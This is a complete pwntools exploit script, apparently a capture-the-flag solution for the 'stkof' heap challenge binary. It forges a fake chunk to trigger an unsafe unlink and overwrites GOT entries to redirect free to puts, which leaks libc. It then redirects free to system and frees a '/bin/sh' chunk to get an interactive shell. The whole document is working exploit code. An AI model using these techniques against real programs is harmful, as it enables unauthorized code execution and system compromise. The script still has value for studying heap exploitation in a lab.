from pwn import *
#from LibcSearcher import *
context.log_level = 'debug'

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('./stkof')
p = process("./stkof")
gdb.attach(p)

def alloc(size):
    p.sendline('1')
    p.sendline(str(size))
    p.recvuntil('OK\n')

def delete(id):
    p.sendline('3')
    p.sendline(str(id))
    p.recvuntil('OK\n')

def edit(id,msg):
    p.sendline('2')
    p.sendline(str(id))
    p.sendline(str(len(msg)))
    p.send(msg)
    p.recvuntil('OK\n')

#raw_input()
alloc(0xb0)
alloc(0x30)
alloc(0xb0)
alloc(0xb0)
s_array =0x602140
# stage1:construct fake heap
aim = s_array+0x10
FD = aim - 0x18
BK = aim -0x10
payload = p64(0x0) + p64(0x31) + p64(FD) + p64(BK)
payload = payload.ljust(0x30,'a')
payload += p64(0x30) + p64(0xc0)
edit(2,payload)
#raw_input()
delete(3)		#unlink
#raw_input()
#stage2:leak libc
free_got = elf.got['free']
fread_got = elf.got['fread']
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
print "puts_got:%8x,free_got:%8x,fread_got:%16x,puts_plt:%8x" %(puts_got,free_got,fread_got,puts_plt)
payload = p64(0x0) + p64(fread_got) + p64(puts_got) + p64(free_got)
edit(2,payload)
#raw_input()
edit(2,p64(puts_plt))		#write puts_plt to free_got
p.sendline('3')
#raw_input()
p.sendline(str(0))
fread = p.recvuntil('\nOK\n',drop=True).ljust(8,'\x00')
print fread
print hex(u64(fread))
libc_base = u64(fread) - libc.symbols['fread']
print "libc base address:%x" %libc_base
raw_input()
#stage3:get shell
system = libc_base + libc.symbols['system']
edit(2,p64(system))
edit(4,"/bin/sh\x00")
p.sendline('3')
p.sendline(str(4))

p.interactive()
